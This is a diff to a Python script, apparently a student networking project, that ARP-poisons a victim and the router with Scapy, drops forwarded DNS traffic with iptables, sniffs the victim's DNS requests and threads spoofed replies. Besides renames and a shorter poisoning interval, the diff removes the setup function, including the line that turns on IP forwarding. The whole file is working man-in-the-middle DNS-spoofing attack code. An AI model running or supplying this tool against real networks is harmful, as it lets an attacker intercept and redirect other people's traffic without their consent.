@@ -33,15 +33,12 @@ args = parser.parse_args()
 vIP = args.victimIP
 targetIP = args.targetIP
 routerIP = args.routerIP
-localMAC = ""
 victimMAC = ""
+localMAC = ""
 routerMAC = ""
 
-#Setup function
-def setup():
-    #setup forwarding rules
-    #disable forwarding of DNS requests to router
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+#iptables drop function
+def iptablesrule():
     #iptables rule
     Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
 
@@ -50,13 +47,12 @@ def reset():
     Popen(["iptables -F"], shell=True, stdout=PIPE)
 
 #get MACaddress of local machine
-def getOurMAC(interface):
+def getLocalMAC(interface):
     try:
         mac = open('/sys/class/net/'+interface+'/address').readline()
     except:
         mac = "00:00:00:00:00:00"
     return mac[0:17]
-
 
 #returns MAC address of victim IP
 def getTargetMAC(IP):
@@ -65,21 +61,19 @@ def getTargetMAC(IP):
     pid = Popen(["arp", "-n", IP], stdout=PIPE)
     s = pid.communicate()[0]
     MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
-
     return MAC
-
 
 #constructs and sends arp packets to send to router and to victim.
 def ARPpoison(localMAC, victimMAC, routerMAC):
     arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=vIP, op=2)
     arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=vIP, pdst=routerIP, op=2)
-    print str(vIP) + " has been poisoned."
+    print str(vIP) + " has been ARP poisoned."
     while True:
         try:
             sendp(arpPacketVictim, verbose=0)
             sendp(arpPacketRouter, verbose=0)
             #pause between each send
-            time.sleep(3)
+            time.sleep(2)
         except KeyboardInterrupt:
             sys.exit(0)
 
@@ -99,7 +93,7 @@ def parse(packet):
         replyThread.start()
 
 #initiate sniff filter for DNS requests
-def DNSsniffer():
+def DNSsniff():
     global vIP
     print "Sniffing DNS"
     sniffFilter = "udp and port 53 and src " +str(vIP)
@@ -108,16 +102,13 @@ def DNSsniffer():
 # main function
 def main():
     victimMAC = getTargetMAC(vIP)
-    localMAC = getOurMAC("eno1")#Datacomm card
     routerMAC = getTargetMAC(routerIP)
-
+    localMAC = getLocalMAC("eno1")#Datacomm card
     #threads creation
     ARPThread = threading.Thread(target=ARPpoison, args=(localMAC, victimMAC, routerMAC))
-    sniffThread = threading.Thread(target=DNSsniffer)
-    #
+    sniffThread = threading.Thread(target=DNSsniff)
     ARPThread.daemon = True
     sniffThread.daemon = True
-    #
     ARPThread.start()
     sniffThread.start()
 
@@ -131,5 +122,5 @@ def main():
             sys.exit(0)
 
 #--------------------------------------------------
-setup()
+iptablesrule()
 main()
